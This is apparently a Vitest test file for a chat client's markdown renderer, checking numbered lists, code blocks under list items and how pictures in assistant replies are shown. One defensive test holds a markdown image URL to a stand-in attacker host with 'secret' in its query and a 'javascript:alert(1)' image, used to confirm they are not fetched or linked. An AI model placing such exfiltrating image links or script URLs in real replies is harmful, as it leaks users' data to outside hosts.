// @vitest-environment jsdom
// Devices run 2026-10-06 (B13): every numbered item in a reply read "1.", and a screenshot the Trunk returned showed
// as a raw markdown link to a local path instead of a picture.
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, describe, expect, it } from "vitest";
import type { WindowEngine } from "../connect/engine";
import { ThreadContext } from "./context";
import { Markdown, parseMarkdown } from "./markdown";
import { assistantMediaUrl } from "../connect/session";

Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true });
let root: Root | undefined;
afterEach(async () => { if (root) await act(async () => root!.unmount()); root = undefined; document.body.innerHTML = ""; });

const KEY = "agent:juniper:main";
/** The engine handle as the session builds it: pictures on the Trunk's computer come from the assistant-media route. */
const engine: WindowEngine = {
  sessionKey: KEY, agentId: "juniper", scopes: [], onEvent: () => () => {}, request: (async () => ({})) as WindowEngine["request"],
  mediaUrl: (source) => assistantMediaUrl("ws://127.0.0.1:19700", source, KEY, "juniper", "tok"),
};

async function mount(text: string, e: WindowEngine | undefined = engine) {
  const host = document.body.appendChild(document.createElement("div"));
  root = createRoot(host);
  await act(async () => root!.render(<ThreadContext.Provider value={{ engine: e, name: "Juniper", toast: () => undefined, running: false }}><Markdown text={text} /></ThreadContext.Provider>));
  await act(async () => {});
  return host;
}

describe("numbered lists", () => {
  it("keeps counting across blank lines and notes under an item", async () => {
    const text = "Steps:\n\n1. Open the page.\n\n2. Take a screenshot.\n   It is saved in the workspace.\n\n3. Reply with it.";
    const lists = parseMarkdown(text).filter((b) => b.type === "list");
    expect(lists).toHaveLength(1);
    expect(lists[0]).toMatchObject({ ordered: true, start: 1, items: [{ text: "Open the page." }, { text: "Take a screenshot.\nIt is saved in the workspace." }, { text: "Reply with it." }] });
    const host = await mount(text);
    expect(host.querySelectorAll("ol")).toHaveLength(1);
    expect(host.querySelectorAll("ol > li")).toHaveLength(3);
  });

  it("starts at the reply's own number when a paragraph splits the list", async () => {
    const host = await mount("1. First\n2. Second\n\nA note.\n\n3. Third");
    const lists = [...host.querySelectorAll("ol")];
    expect(lists.map((ol) => ol.getAttribute("start"))).toEqual([null, "3"]);
  });

  it("keeps sub-bullets with their numbered item", () => {
    const blocks = parseMarkdown("1. Fruit\n   - apple\n   - pear\n2. Veg");
    expect(blocks).toMatchObject([{ type: "list", ordered: true, items: [{ text: "Fruit\n- apple\n- pear" }, { text: "Veg" }] }]);
  });
});

describe("code blocks under list items", () => {
  it("keep a fenced command under a numbered step as a code block, and the next step keeps counting", async () => {
    const text = "1. Install it:\n   ```bash\n   npm install\n     --save\n   ```\n2. Run it.";
    const blocks = parseMarkdown(text);
    expect(blocks).toMatchObject([
      { type: "list", ordered: true, start: 1, items: [{ text: "Install it:" }] },
      { type: "code", lang: "bash", text: "npm install\n  --save" },
      { type: "list", ordered: true, start: 2, items: [{ text: "Run it." }] },
    ]);
    const host = await mount(text);
    expect(host.textContent).not.toContain("```");
    expect([...host.querySelectorAll("ol")].map((ol) => ol.getAttribute("start"))).toEqual([null, "2"]);
  });

  it("keep a quote, maths or a table under an item as their own blocks, also after a blank line", () => {
    const blocks = parseMarkdown("1. Note:\n\n   > careful\n2. Sum:\n   $$a+b$$\n3. Table:\n   | a | b |\n   | --- | --- |\n   | 1 | 2 |");
    expect(blocks.map((b) => b.type)).toEqual(["list", "quote", "list", "math", "list", "table"]);
  });
});

describe("pictures in replies", () => {
  it("shows a screenshot the Trunk saved inline, of any size, through the assistant-media route", async () => {
    const host = await mount("Here it is:\n\n[screenshot](/home/ubuntu/ws/shot.png)");
    const img = host.querySelector(".picture img") as HTMLImageElement;
    const url = new URL(img.getAttribute("src")!);
    expect(url.origin + url.pathname).toBe("http://127.0.0.1:19700/__branch__/assistant-media");
    expect(Object.fromEntries(url.searchParams)).toEqual({ source: "/home/ubuntu/ws/shot.png", sessionKey: KEY, agentId: "juniper", token: "tok" });
    expect(img.getAttribute("referrerpolicy")).toBe("no-referrer");
    expect(img.alt).toBe("screenshot");
    expect(host.textContent).not.toContain("/home/ubuntu");
  });

  it("uses https for a wss gateway", () => {
    expect(assistantMediaUrl("wss://hub.example:443/", "/a.png", KEY, undefined, null)).toBe(`https://hub.example/__branch__/assistant-media?source=%2Fa.png&sessionKey=${encodeURIComponent(KEY)}`);
  });

  it("never fetches a picture on the web by itself: it stays a link to open on purpose", async () => {
    const host = await mount("![Chart](https://attacker.example/c.png?q=secret)\n\nSee [this](https://example.com/x.png) and ![x](javascript:alert(1))");
    expect(host.querySelector("img")).toBeNull();
    const links = [...host.querySelectorAll("a")].map((a) => [a.textContent, a.getAttribute("href")]);
    expect(links).toEqual([["Chart", "https://attacker.example/c.png?q=secret"], ["this", "https://example.com/x.png"]]);
    expect(host.textContent).toContain("x");
  });

  it("shows a picture whose bytes are in the reply", async () => {
    const host = await mount("![dot](data:image/png;base64,iVBORw0KGgo=)");
    expect((host.querySelector(".picture img") as HTMLImageElement).getAttribute("src")).toBe("data:image/png;base64,iVBORw0KGgo=");
  });

  it("says Picture unavailable when it doesn't load, and Try again asks again", async () => {
    const host = await mount("![Screen](/tmp/shot.png)");
    const img = host.querySelector(".picture img")!;
    await act(async () => img.dispatchEvent(new Event("error")));
    const gone = host.querySelector('[data-testid="picture-unavailable"]')!;
    expect(gone.textContent).toBe("IMGScreenPicture unavailableTry again");
    await act(async () => (gone.querySelector("button") as HTMLButtonElement).click());
    expect(new URL(host.querySelector(".picture img")!.getAttribute("src")!).searchParams.get("try")).toBe("1");
  });

  it("shows a picture named inside a sentence small and inline (no block inside the paragraph)", async () => {
    const host = await mount("Before ![s](/home/ubuntu/ws/s.png) after.");
    expect(host.querySelector("p img.md-inline-picture")).not.toBeNull();
    expect(host.querySelector("p .attachments")).toBeNull();
  });

  it("names a local non-picture file without a broken link", async () => {
    const host = await mount("Saved to [report.md](/home/ubuntu/ws/report.md).");
    expect(host.querySelector("a")).toBeNull();
    expect(host.querySelector(".md-path")?.getAttribute("title")).toBe("/home/ubuntu/ws/report.md");
  });
});
